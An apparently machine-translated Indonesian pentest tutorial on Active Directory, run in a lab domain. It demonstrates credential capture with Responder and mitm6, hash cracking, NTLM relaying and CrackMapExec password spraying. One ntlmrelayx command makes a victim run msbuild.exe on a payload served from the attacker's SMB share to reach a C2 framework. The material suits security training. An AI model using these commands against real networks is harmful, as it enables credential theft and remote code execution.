<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>âœğŸ» ğŸ¤ ğŸš¾ Direktori Aktif Pentest. Bagian 1 ğŸ¤  ğŸ¤¶ğŸ¾ âœ‰ï¸</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Terjemahan artikel disiapkan khusus untuk siswa Pentest. Praktik Pengujian Penetrasi . â€ 



 Saya memiliki beberapa klien yang datang kepada saya seb...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Direktori Aktif Pentest. Bagian 1</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/otus/blog/481348/">  <i>Terjemahan artikel disiapkan khusus untuk siswa <a href="https://otus.pw/QXrl/">Pentest.</a></i>  <i><a href="https://otus.pw/QXrl/">Praktik Pengujian Penetrasi</a> . <a href="https://otus.pw/QXrl/">â€</a></i> <br><hr><br><img src="https://habrastorage.org/webt/p6/3r/kw/p63rkwok1ndkvwwmwfgwiekna6w.png"><br><br>  Saya memiliki beberapa klien yang datang kepada saya sebelum pentest dengan keyakinan bahwa mereka dalam kondisi yang baik, karena analisis kerentanan mereka tidak menunjukkan kerentanan kritis, dan bahwa mereka siap untuk pentest, hanya agar saya akan menerima hak administrator domain dalam lima belas menit, hanya memanfaatkan kesalahan konfigurasi dalam AD. <br><a name="habracut"></a><br>  Salah satu celah dalam pendidikan yang saya lihat dalam pengujian penetrasi adalah kurangnya kesadaran ketika datang ke Active Directory Pentesting (AD).  Sayangnya, OSCP tidak mengajarkan pengujian AD, dan bahkan kursus SANS GPEN hampir tidak menyentuh ini.  Tujuan dari seri ini adalah untuk membantu menunjukkan beberapa trik, alat, dan teknik yang telah saya gunakan di masa lalu untuk keberhasilan pentest menggunakan AD.  Ini tidak berarti panduan lengkap untuk setiap metode atau alat.  Sepanjang seri ini, saya akan menggunakan Kali Linux 2019 dan bekerja di domain dummy saya melalui mesin virtual. <br><br>  Mari kita mulai dengan mendefinisikan <b>target</b> : tujuan dari tes penetrasi adalah untuk mengidentifikasi kemungkinan vektor serangan yang akan digunakan oleh seorang penyerang untuk membobol jaringan.  Ini <b>bukan hanya</b> tentang mendapatkan hak administrator domain dan kemudian keluar. <br><br>  Sekarang kita memiliki tujuan, kita harus mengambil beberapa langkah untuk mencapainya.  Di bawah ini adalah panduan visual (kasar) untuk siklus pentesting. <br><br><img src="https://habrastorage.org/webt/4h/xu/hi/4hxuhi10tttcfiblcafsfmdt7-e.png"><br>  <i>Diposting oleh: Microsoft</i> <br><br>  <b>Sinopsis</b> : Seorang klien telah mempekerjakan Anda untuk menjalankan tes penetrasi pada jaringan mereka yang menggunakan Active Directory.  Anda belum diberi apa-apa.  Anda tidak memiliki kredensial, tidak ada batas pengujian, tidak ada izin masuk ke pintu depan, tetapi Anda berhasil mendapatkan di belakang seseorang melalui pintu dan menemukan ruang terpencil dengan telepon IP.  Anda mencabut telepon IP Anda, pasang laptop Anda, dan temukan diri Anda online.  Apa selanjutnya  <b>Implementasi</b> . <br><br><h3>  Fase I |  Implementasi </h3><br>  Tanpa kredensial, kita hanya dapat melakukan pengintaian terbatas, dan pengintaian akan terjadi di hampir setiap tahap siklus, namun ada beberapa hal yang dapat kita lakukan segera untuk mendapatkan pijakan di jaringan.  Pertama, karena kita memiliki akses ke jaringan, periksa saja subnet yang sedang kita kerjakan melalui ifconfig atau ipconfig.  Setelah menerima alamat IP, keluarkan perintah ping di nmap untuk melihat apakah perangkat lain tersedia. <br><br><pre><code class="plaintext hljs">nmap -sn 192.168.1.1/24</code> </pre> <br>  Jika perangkat kembali, maka Anda berada dalam bisnis.  Jika Anda tidak menerima apa pun, ICMP mungkin dinonaktifkan, tidak ada perangkat lain di jaringan, atau karena Anda belum diautentikasi, Anda tidak dapat berkomunikasi dengan perangkat lain dan mungkin telah diblokir oleh solusi keamanan identitas (misalnya, Cisco ISE).  Demi artikel ini, mari kita asumsikan bahwa beberapa mesin kembali dan Anda dapat melakukan ping dengan sukses. <br><br><hr><br>  <i><b>Alat</b></i> : <a href="https://github.com/SpiderLabs/Responder">Penanggap</a> <br><br>  Selanjutnya, kita akan menggunakan alat yang disebut <b>Responder</b> , atau, jika Anda tidak peduli dengan Windows, <b>Inveigh</b> .  Kedua alat ini memeriksa kesalahan yang sangat umum dalam konfigurasi AD, yang mengarah pada kemungkinan meracuni WPAD dan NBT-NS.  Secara default, Windows dikonfigurasikan untuk mencari file konfigurasi proxy otomatis (PAC) melalui penemuan proxy web otomatis (WPAD).  Penting untuk dicatat bahwa WPAD bukan protokol yang melakukan pencarian, tetapi hanya seperangkat prosedur yang memungkinkan perangkat untuk menemukan file PAC.  Secara otomatis mendeteksi file PAC berguna untuk organisasi karena perangkat akan mengirim siaran meminta file proxy dan menerimanya.  Namun, tentu saja, itu tidak mengotentikasi siapa yang mengirim file proxy, yang memungkinkan penyerang untuk mengirim tanggapan palsu, yang kemudian meminta kredensial. <br><br>  Pada Kali responder diinstal secara default. <br><br><pre> <code class="plaintext hljs">responder -I eth0 --wpad</code> </pre> <br>  Di komputer Windows 7 saya, saya membuka Internet Explorer dan pergi ke Google, yang kemudian mulai mencari file WPAD.  Di Responder, saya melihat bagaimana permintaan itu tiba, setelah itu Responder secara otomatis menanggapi permintaan tersebut, sebagai akibatnya korban mengirimkan nama pengguna dan kata sandi yang diacak (dalam format NTLMv2). <br><br><img src="https://habrastorage.org/webt/4g/fo/wr/4gfowr6lflqcpzh1-cwcbs75vlo.png"><br><br>  Ada beberapa hal yang bisa kita lakukan dengan hash ini.  Kita dapat mencoba <code>ntlmrelay.py</code> atau menyampaikannya menggunakan alat seperti <code>ntlmrelay.py</code> .  Saya berbicara tentang cara menerjemahkan hasht ntlm di <a href="https://hausec.com/2017/10/25/automating-the-pentesting-process-how-llmnr-spoofing-can-lead-to-domain-admin-in-5-minutes/">artikel ini</a> , jadi saya akan melanjutkan untuk meretasnya, karena ini biasanya persis apa yang saya lakukan dalam praktek. <br><br>  Sejujurnya, saya jarang memecahkan kata sandi di Linux / Kali.  Saya menggunakan GPU nvidia, yang tidak pernah menginstal dengan benar di Kali, plus ada HashcatGUI di Windows, yang membuat prosesnya jauh lebih mudah, dan ini yang akan saya gunakan.  Saya mengambil hash yang dihasilkan, meletakkannya di file yang disebut <i>"hash.txt"</i> dan menjalankan beberapa daftar kata / aturan di atasnya.  Tetapi dalam kasus ini, saya hanya menjalankan <code>rockyou.txt</code> dan di-hack sebentar. <br><br><img src="https://habrastorage.org/webt/mw/4x/ne/mw4xneie6ludbspzquxvhsuwjq8.png"><br>  <i>Pengaturan saya untuk HashcatGUI.</i> <br><br><img src="https://habrastorage.org/webt/km/ca/ze/kmcazexh-eid8rksx8uoybd5yye.png"><br>  <i>Kata Sandi yang Diretas - â€œKata Sandi!â€</i> <br><br>  Sekarang kami telah berhasil memecahkan kata sandi, kami memiliki kredensial "Alice: Kata Sandi"! <br><br>  Sebelum melanjutkan, ada beberapa metode lain yang ingin saya tunjukkan seandainya Responder tidak berfungsi. <br><br><hr><br>  <i><b>Alat</b></i> : <a href="https://github.com/fox-it/mitm6">mitm6</a> <br><br>  Katakanlah jaringan klien menggunakan file PAC yang sah, dan spoofing Anda tidak berfungsi.  Ada metode lain yang menggunakan IPv6 dan DNS untuk meneruskan kredensial ke target.  Secara default, IPv6 diaktifkan dan sebenarnya lebih disukai daripada IPv4.  Ini berarti bahwa jika komputer memiliki server DNS IPv6, ia akan <i>memilih</i> IPv4.  Juga, secara default, mesin Windows mencari server DNS IPv6 melalui permintaan DHCPv6, yang berarti jika kita memalsukan server DNS IPv6, kita dapat secara efektif mengontrol bagaimana perangkat akan meminta DNS.  Baca lebih lanjut tentang ini di <a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/">sini</a> . <br><br>  Unduh <a href="https://github.com/fox-it/mitm6">mitm6 terlebih dahulu</a> . <br><br><pre> <code class="plaintext hljs">git clone https://github.com/fox-it/mitm6.git cd mitm6 pip install .</code> </pre> <br>  Kemudian jalankan di workgroup jaringan target.  Karena kami sebelumnya melakukan ping jaringan, kami juga mendapat nama NetBIOS, mengetahui bahwa domain target adalah <code>lab.local</code> . <br><br>  Inilah yang tampak seperti pengaturan IP target sebelum saya mulai <code>mitm6</code> <br><br><img src="https://habrastorage.org/webt/3d/vv/vr/3dvvvrilsufnvgatvst4bwmmkgc.png"><br>  <i>Perhatikan satu server DNS</i> <br>  Lalu saya meluncurkan mitm6 <br><br><pre> <code class="plaintext hljs">mitm6 -d lab.local</code> </pre> <br><img src="https://habrastorage.org/webt/bc/sl/qm/bcslqmbg7zlncefnc-1xukg55rk.png"><br><br>  Dan sekarang tujuan dari server DNS telah berubah <br><br><img src="https://habrastorage.org/webt/qm/qe/ko/qmqekoijtpdxp4d57ro02p3kr1u.png"><br>  <i>Catat alamat IPv6 sebagai server DNS.</i> <i><br></i> <br>  Sekarang kerentanan sebenarnya adalah bahwa Windows lebih suka IPv6 daripada IPv4, yaitu, sekarang saya mengontrol DNS. <br><br>  Jadi sekarang kita menggunakan fakta bahwa kita mengendalikan DNS dengan spoofing tanggapan WPAD melalui <code>ntlmrelayx.py</code> .  Saya menulis <a href="https://hausec.com/how-to-set-up-ntlmrelayx-py/">panduan</a> tentang cara menginstalnya. <br><br>  Dengan mitm6 berjalan di satu jendela, buka yang lain dan jalankan <code>ntlmrelayx.py</code> <br><br><pre> <code class="plaintext hljs">ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i</code> </pre> <br>  <i><code>-wh</code> : server hosting file WPAD (penyerang IP)</i> <i><br></i>  <i><code>-t</code> : target (Anda tidak dapat meneruskan kredensial ke perangkat yang sama dengan yang Anda buat)</i> <i><br></i>  <i><code>-i</code> : buka shell interaktif</i> <br><br><img src="https://habrastorage.org/webt/8p/wh/cu/8pwhcuwgx_6wyskxawrr5cq8db0.png"><br><br>  Dari sini Anda dapat terhubung ke sistem kontrol dan pemantauan (C2) pilihan Anda.  Dalam hal ini, saya menggunakan SILENTTRINITY, jadi saya menggunakan perintah -c untuk mengeksekusi perintah saya, yang dalam hal ini menggunakan MSBuild untuk membuat muatan berbahaya saya. <br><br><pre> <code class="xml hljs">ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.50/ --no-smb-server -c 'C:\Windows\Microsoft.NET\Framework64\v3.5\msbuild.exe \\192.168.218.129\SMB\msbuild.xml'</code> </pre> <br><img src="https://habrastorage.org/webt/mz/wg/la/mzwglak5n0kzty0vgqy4z7g5kya.png"><br><br>  Tetapi tidak, <code>msbuild.exe</code> tidak membuat file XML dalam kasus ini, dan saya tidak mendapatkan koneksi ke SILENTTRINITY, karena itu akan terlalu sederhana.  Sebaliknya, saya melihat server SMB saya dan melihat hash relay <br><br><img src="https://habrastorage.org/webt/b_/vf/qk/b_vfqka5be-1bek_90jncfywhge.png"><br><br>  Yang saya, pada gilirannya, retas. <br><br><img src="https://habrastorage.org/webt/s3/e5/qa/s3e5qaojtbishyvggzxt52orsdy.png"><br><br>  Dan sekarang kami memiliki kredensial jaringan tanpa menggunakan Responder. <br><br><hr><br>  <i><b>Alat</b></i> : <a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> <br><br>  <b>CrackMapExec</b> pada dasarnya adalah pisau <b>pentester</b> Swiss.  Dari serangan semprotan kata sandi dan transfer hash, hingga menjalankan perintah, itu harus ada di setiap rangkaian alat untuk pentester. <br><br>  Jika semuanya gagal, kita dapat mencoba menggunakan serangan semprotan kata sandi.  Ada alasan mengapa metode ini adalah yang terakhir, dan ini karena kunci kata sandi.  Pemblokiran kata sandi tidak biasa seperti yang Anda pikirkan, yang memungkinkan penyerang menggunakan serangan kamus berdasarkan nama pengguna.  Memperoleh nama pengguna adalah langkah pertama yang bisa dilakukan melalui OSINT dan dengan theHarvester.  Jika kami tidak memiliki nama pengguna dari OSINT, kami juga dapat memberi CrackMapExec (CME) daftar nama pengguna, tetapi demi waktu, anggaplah kami memiliki <b>nama pengguna rsmith</b> . <br><br>  Jika Anda berada di Kali, CrackMapExec harus sudah diinstal, jika Anda menggunakan versi yang lebih baru, tetapi jika tidak, Anda dapat menginstalnya <br><br><pre> <code class="plaintext hljs">apt-get install crackmapexec</code> </pre> <br>  Karena hasil pemindaian kami menemukan perangkat di jaringan, kami dapat memberikan CME daftar kata sandi yang dipasangkan dengan nama pengguna dan mencoba masuk. <br><br><pre> <code class="plaintext hljs">crackmapexec smb 192.168.218.40 -d lab.local -u rsmith -p ~/Documents/wordlists/fasttrack.txt --shares</code> </pre> <br>  Setelah beberapa detik, kata sandi ditemukan. <br><br><img src="https://habrastorage.org/webt/uo/b7/ed/uob7edro_ir8xggvgxezdcqjjek.png"><br><br>  Kredensial ditemukan! <br><br>  Mungkin terlihat terlalu CTF, tetapi musim: tahun adalah kombinasi kata sandi yang sangat populer. <br><br>  Dengan kredensial ini diperoleh, kami sekarang memiliki akun pengguna.  Kami akan beralih ke eskalasi hak istimewa di bagian <a href="https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/">kedua</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id481348/">https://habr.com/ru/post/id481348/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id481338/index.html">Memanfaatkan kerentanan xss</a></li>
<li><a href="../id481340/index.html">7 hari, 15 insinyur dan 600 server: Yandex.Money pindah ke pusat data baru</a></li>
<li><a href="../id481342/index.html">Polling Jumat: Berbicara Tentang Bahasa</a></li>
<li><a href="../id481344/index.html">Rencana Tim Platform IntelliJ untuk 2020</a></li>
<li><a href="../id481346/index.html">5 perubahan besar dalam industri otomotif</a></li>
<li><a href="../id481350/index.html">Siapa yang bekerja di kosmodrom Plesetsk</a></li>
<li><a href="../id481352/index.html">DBA: membersihkan catatan klon dari tabel tanpa PK</a></li>
<li><a href="../id481354/index.html">TelegramBot. Fungsionalitas dasar. Terbang secara terpisah, irisan daging secara terpisah. (Bagian 2)</a></li>
<li><a href="../id481356/index.html">Terima kasih, 2019</a></li>
<li><a href="../id481358/index.html">C ++ Rusia: bagaimana itu</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>